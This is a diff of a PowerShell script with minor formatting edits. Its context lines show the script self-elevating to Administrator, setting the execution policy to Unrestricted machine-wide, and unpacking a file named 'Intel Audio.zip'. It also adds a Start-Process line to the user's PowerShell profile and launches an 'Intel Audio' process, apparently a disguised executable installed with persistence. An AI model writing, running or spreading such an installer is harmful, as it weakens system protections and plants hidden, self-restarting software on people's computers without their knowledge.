@@ -1,4 +1,4 @@
-Clear-Host
+#``Clear-Host
 # Self-elevate the script if required
 if (-Not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator')) {
       if ([int](Get-CimInstance -Class Win32_OperatingSystem | Select-Object -ExpandProperty BuildNumber) -ge 6000) {
@@ -18,7 +18,7 @@ $TargetZip = "$TargetPath\Intel Audio.zip"
 $PowershellPath = "$env:USERPROFILE\Documents\WindowsPowerShell"
 $PowershellFile = "$PowershellPath\Microsoft.PowerShell_profile.ps1"
 
-Set-ExecutionPolicy Unrestricted -Scope LocalMachine`
+Set-ExecutionPolicy Unrestricted -Scope LocalMachine
 Set-ExecutionPolicy Unrestricted -Scope CurrentUser
 
 if (-Not (Test-Path $FolderPath)) {
@@ -73,3 +73,4 @@ if (Select-String -Path $PowershellFile "Start-Process") {
 if (-Not (Get-Process -Name 'Intel Audio')) {
       Start-Process $TargetFile
 }
+``
